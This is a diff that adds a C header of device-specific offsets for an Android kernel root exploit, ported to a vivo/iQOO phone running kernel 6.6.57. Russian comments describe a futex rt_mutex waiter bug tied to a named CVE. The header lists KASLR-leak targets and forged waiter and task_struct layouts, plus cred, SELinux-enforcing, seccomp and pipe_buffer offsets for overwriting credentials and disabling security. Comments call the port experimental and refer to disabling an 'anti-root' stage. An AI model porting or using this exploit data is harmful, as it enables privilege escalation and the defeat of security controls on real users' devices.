@@ -1,0 +1,212 @@
+#ifndef OFFSET_H
+#define OFFSET_H
+
+/* RMV port (PD2453 / iQOO Z10 Turbo Pro CN, kernel 6.6.57-android15-8-
+ * gda7e4eafe109-abogki418618663-4k, прошивки OriginOS 5
+ * 15.0.7.8/15.0.8.3/15.0.8.15.W10.V000L1 (boot из 15.0.7.8, OTA 20250520)). Символы — kallsyms из boot.img,
+ * извлечённого из официального OTA (REPLACE_ZSTD, boot sha256 9b795858…,
+ * сверка с манифестом payload.bin прошла). KASLR-база 6.6-линейки:
+ * KIMAGE_TEXT_BASE = 0xffffffc080000000 (как у всех vivo 6.6 GKI).
+ *
+ * ТРАНСПОРТ: PSELECT (не MCAST). Стек-геометрия этого ядра побайтно
+ * совпадает с device-verified 6.6.89 (Neo11, g1f71897ac249, shift=0):
+ *   pselect6 0x90 -> core_sys_select 0x1f0 -> do_select 0x3c0 (slots @sp+0xe0);
+ *   futex 0x70+0x60+0x1c0, waiter local sp+0x90 (мрс sp_el0-форма current);
+ *   remove_waiter в УЯЗВИМОЙ форме (waiter->task читается после операций
+ *   над current — сигнатура unpatched CVE-2026-43499).
+ * => WAITER_WORD_SHIFT 0, как на живом 6.6.89. MCAST здесь не нужен.
+ *
+ * СТАТУС: ЭКСПЕРИМЕНТАЛЬНЫЙ. Пейлоад 6.6.89 device-verified; у 6.6.57
+ * совпадает вся stack-геометрия и форма remove_waiter, но на устройстве
+ * этот билд не запускался. VR-стадия отключена (vr.ko символы не
+ * верифицированы на PD2453).
+ */
+
+#define WAITER_WORD_SHIFT 0
+
+#define BUILD_VARIANT_LABEL "pd2453-z10tp-6.6.57-da7e"
+#define BUILD_FINGERPRINT "iQOO/PD2453/V2453A (kernel 6.6.57-android15-8-gda7e4eafe109, OriginOS 5 15.0.7.8.W10.V000L1)"
+
+/* ---- Memory layout ---- */
+#define KIMAGE_TEXT_BASE             0xffffffc080000000ULL
+#define P0_PAGE_OFFSET               0xffffff8000000000ULL
+#define P0_PHYS_OFFSET               0x80000000ULL
+#define P0_KERNEL_PHYS_LOAD          0xa8000000ULL
+#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
+#define DIRECT_MAP_BASE              0xffffff8000000000ULL
+#define DIRECT_MAP_END              0xffffff9000000000ULL
+#define VMEMMAP_START                0xfffffffe00000000ULL
+
+/* ---- Core kernel symbols (image-relative, kallsyms boot.img 15.0.7.8) ---- */
+#define ASHMEM_MISC_FOPS_OFF 0x0222a098ULL
+#define ASHMEM_FOPS_OFF 0x012cc2d8ULL
+#define ASHMEM_IOCTL_OFF 0x00c6cac0ULL
+#define ASHMEM_COMPAT_IOCTL_OFF 0x00c6d17cULL
+#define ASHMEM_MMAP_OFF 0x00c6d1d0ULL
+#define ASHMEM_OPEN_OFF 0x00c6d3f0ULL
+#define ASHMEM_RELEASE_OFF 0x00c6d478ULL
+#define ASHMEM_SHOW_FDINFO_OFF 0x00c6d504ULL
+#define CONFIGFS_READ_ITER_OFF 0x00482bccULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x004830f8ULL
+#define COPY_SPLICE_READ_OFF 0x00407becULL
+#define NOOP_LLSEEK_OFF 0x003bad8cULL
+#define INIT_TASK_OFF 0x020ce280ULL
+#define ROOT_TASK_GROUP_OFF 0x022c0600ULL
+#define INIT_CRED_OFF 0x020e0678ULL
+#define SELINUX_BLOB_SIZES_OFF 0x0164ab08ULL
+/* selinux_state.enforcing: enforcing bool@0 (CONFIG_SECURITY_SELINUX_DEVELOP). */
+#define SELINUX_ENFORCING_OFF 0x02301db8ULL
+#define SECURITY_HOOK_HEADS_OFF 0x0164a3d0ULL
+#define KMALLOC_CACHES_OFF 0x01649f10ULL
+#define ANON_PIPE_BUF_OPS_OFF 0x0113d588ULL
+
+#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
+#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
+#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
+#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
+#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
+#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
+#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
+#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
+#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
+#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
+#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
+#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
+#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
+#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
+#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
+#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+
+/* ---- SLIDE (KASLR leak) targets ---- */
+#define SLIDE_NFULNL_LOGGER_OFF 0x020c2268ULL
+#define SLIDE_LOGGERS_0_1_OFF 0x020c21b8ULL  /* = LOGGER - 0xB0 */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02322da8ULL  /* sysctl_bootid */
+#define SLIDE_NFULNL_LOG_PACKET_OFF 0x00e390f0ULL
+#define SLIDE_BOOTID_LEAK_SOURCE_OFF     (SLIDE_NFULNL_LOGGER_OFF + 0x10ULL)
+#define SLIDE_BOOTID_LEAK_VALUE_OFF      SLIDE_NFULNL_LOG_PACKET_OFF
+#define SLIDE_PROC_DO_UUID_OFF 0x0089c894ULL
+#define SLIDE_INIT_TASK_OFF 0x020ce280ULL
+#define SLIDE_ROOT_TASK_GROUP_OFF 0x022c0600ULL
+#define SLIDE_SYSCTL_BOOTID_OFF 0x02322da8ULL
+
+#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
+#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
+#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
+#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
+#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+
+/* ---- Layout внутри kernel page ---- */
+#define LOCK_OFF 0x1350
+#define W0_OFF 0x2220
+#define FOPS_OFF 0x1000
+#define SCRATCH_OFF 0x3000
+#define RIGHT_OFF 0x4440
+#define LEFT_OFF 0x5550
+#define FAKE_TASK_OFF 0x3200
+
+/* ---- rt_mutex_waiter (android15-6.6, BTF; как PD2520/I2401) ---- */
+#define WAITER_LOCAL_OFF 0x80ULL
+#define WAITER_TREE_ENTRY_OFF 0x0ULL
+#define WAITER_PI_TREE_ENTRY_OFF 0x28ULL
+#define WAITER_TASK_OFF 0x50ULL
+#define WAITER_LOCK_OFF 0x58ULL
+#define WAITER_WAKE_STATE_OFF 0x60ULL
+#define WAITER_PRIO_OFF 0x18ULL
+#define WAITER_DEADLINE_OFF 0x20ULL
+#define WAITER_WW_CTX_OFF 0x68ULL
+
+/* Forged waiter (форма 6.6) */
+#define FAKE_WAITER_TREE_PRIO_OFF 0x18
+#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
+#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
+#define FAKE_WAITER_TASK_OFF 0x50
+#define FAKE_WAITER_LOCK_OFF 0x58
+#define FAKE_WAITER_WAKE_STATE_OFF 0x60
+#define FAKE_WAITER_WW_CTX_OFF 0x68
+
+/* ---- Fake task_struct fields (BTF 6.6) ---- */
+#define FAKE_TASK_USAGE_OFF 0x40ULL
+#define FAKE_TASK_PRIO_OFF 0x84ULL
+#define FAKE_TASK_NORMAL_PRIO_OFF 0x8cULL
+#define FAKE_TASK_TASK_GROUP_OFF 0x348ULL
+#define FAKE_TASK_PI_LOCK_OFF 0x90cULL
+#define FAKE_TASK_PI_WAITERS_OFF 0x920ULL
+#define FAKE_TASK_PI_TOP_TASK_OFF 0x930ULL
+#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938ULL
+#define FAKE_TASK_UCLAMP_REQ_OFF 0x350ULL
+#define FAKE_TASK_UCLAMP_OFF 0x358ULL
+
+/* ---- configfs buffer (CFG) offsets ---- */
+#define CFG_PAGE_OFF 16
+#define CFG_NEEDS_READ_FILL_OFF 80
+#define CFG_BIN_BUFFER_OFF 88
+#define CFG_BIN_BUFFER_SIZE_OFF 96
+#define CFG_CB_MAX_SIZE_OFF 100
+
+/* ---- task_struct field offsets (BTF 6.6) ---- */
+#define MM_OWNER_OFF 0x5a0ULL
+#define TASK_PID_OFF 0x618ULL
+#define TASK_TGID_OFF 0x61cULL
+#define TASK_REAL_PARENT_OFF 0x628ULL
+#define TASK_ATOMIC_FLAGS_OFF 0x5d8ULL
+#define TASK_REAL_CRED_OFF 0x818ULL
+#define TASK_CRED_OFF 0x820ULL
+#define TASK_COMM_OFF 0x830ULL
+#define TASK_TASKS_OFF 0x550ULL
+#define TASK_THREAD_INFO_FLAGS_OFF 0x0ULL
+#define TASK_SECCOMP_OFF 0x8e8ULL
+
+/* vr.ko anti-root: на PD2453 модуль/символы не верифицированы —
+ * root.c сам выключает VR-стадию через #ifdef VR_TAG_A_OFF. */
+
+/* ---- cred structure offsets (BTF) ---- */
+#define CRED_UID_OFF 0x8ULL
+#define CRED_SECUREBITS_OFF 0x28ULL
+#define CRED_CAPS_OFF 0x30ULL
+#define CRED_SECURITY_OFF 0x80ULL
+#define SELINUX_CRED_BLOB_OFF 0x0ULL
+#define SELINUX_CRED_OSID_OFF  0
+#define SELINUX_CRED_SID_OFF   4
+
+/* ---- seccomp offsets ---- */
+#define SECCOMP_MODE_OFF 0x0ULL
+#define SECCOMP_FILTER_COUNT_OFF 0x4ULL
+#define SECCOMP_FILTER_OFF 0x8ULL
+#define TIF_SECCOMP_BIT           11
+#define PFA_NO_NEW_PRIVS_BIT      0
+
+/* ---- struct page / slab offsets ---- */
+#define STRUCT_PAGE_SIZE              0x40
+#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
+#define STRUCT_SLAB_CACHE_OFF         0x08
+#define STRUCT_PAGE_TYPE_OFF          0x30
+
+/* ---- pipe_buffer offsets ---- */
+#define PIPE_BUFFER_SIZE      0x28
+#define PIPE_BUFFER_SLOTS     32
+#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+
+/* ---- struct file_operations slot offsets (6.6) ---- */
+#define FOPS_OWNER_OFF 0x0
+#define FOPS_LLSEEK_OFF 0x8
+#define FOPS_READ_OFF 0x10
+#define FOPS_WRITE_OFF 0x18
+#define FOPS_READ_ITER_OFF 0x20
+#define FOPS_WRITE_ITER_OFF 0x28
+#define FOPS_IOCTL_OFF 0x48
+#define FOPS_COMPAT_IOCTL_OFF 0x50
+#define FOPS_MMAP_OFF 0x58
+#define FOPS_OPEN_OFF 0x68
+#define FOPS_RELEASE_OFF 0x78
+#define FOPS_SPLICE_READ_OFF 0xb8
+#define FOPS_SHOW_FDINFO_OFF 0xd8
+
+#endif /* OFFSET_H */
